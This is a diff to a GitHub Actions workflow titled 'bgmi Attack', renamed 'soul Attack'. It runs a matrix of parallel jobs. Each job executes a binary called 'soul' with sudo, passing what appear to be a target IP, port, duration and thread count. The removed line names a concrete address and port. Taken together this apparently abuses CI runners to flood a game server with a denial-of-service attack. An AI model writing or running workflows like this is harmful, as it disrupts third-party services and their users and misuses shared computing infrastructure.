@@ -1,8 +1,8 @@
-name: bgmi Attack
+name: soul Attack
 on: [push]
 
 jobs:
-  bgmi:
+  soul:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
@@ -10,5 +10,5 @@ jobs:
             11,12,13,14,15]
     steps:
     - uses: actions/checkout@v3
-    - run: chmod +x bgmi
-    - run: sudo ./soul 20.204.17.153 10062 200 999
+    - run: chmod +x soul
+    - run: sudo ./soul 1 1 100 999
